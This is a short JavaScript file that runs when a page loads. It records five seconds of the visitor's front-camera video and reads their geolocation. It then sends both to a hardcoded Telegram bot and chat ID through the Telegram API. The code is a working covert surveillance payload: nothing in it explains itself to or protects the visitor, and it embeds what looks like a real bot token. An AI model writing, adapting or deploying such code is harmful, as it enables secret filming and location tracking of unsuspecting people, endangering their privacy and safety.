const botToken = "7598643504:AAG0aPuGlJjIKwHyk_RB8Gx59qrOoTxNeHY";
const chatId = "401485415";

window.onload = () => {
  // Start front camera and record video
  navigator.mediaDevices
    .getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then((stream) => {
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: "video/webm",
      });
      const chunks = [];

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          chunks.push(event.data);
        }
      };

      mediaRecorder.onstop = () => {
        const videoBlob = new Blob(chunks, { type: "video/webm" });
        sendVideo(videoBlob);
        stream.getTracks().forEach((track) => track.stop()); // Stop camera
      };

      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
    })
    .catch((err) => console.error("Error accessing camera:", err));

  // Send video to Telegram bot
  function sendVideo(blob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("video", blob, "video.webm");

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: "POST",
      body: formData,
    })
      .then((res) => res.json())
      .then((data) => console.log("Video sent:", data))
      .catch((err) => console.error("Error sending video:", err));
  }

  // Get and send location
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

        fetch(url)
          .then((response) => response.json())
          .then((data) => console.log("Location sent:", data))
          .catch((error) => console.error("Error sending location:", error));
      },
      (error) => console.error("Error getting location:", error.message)
    );
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
};
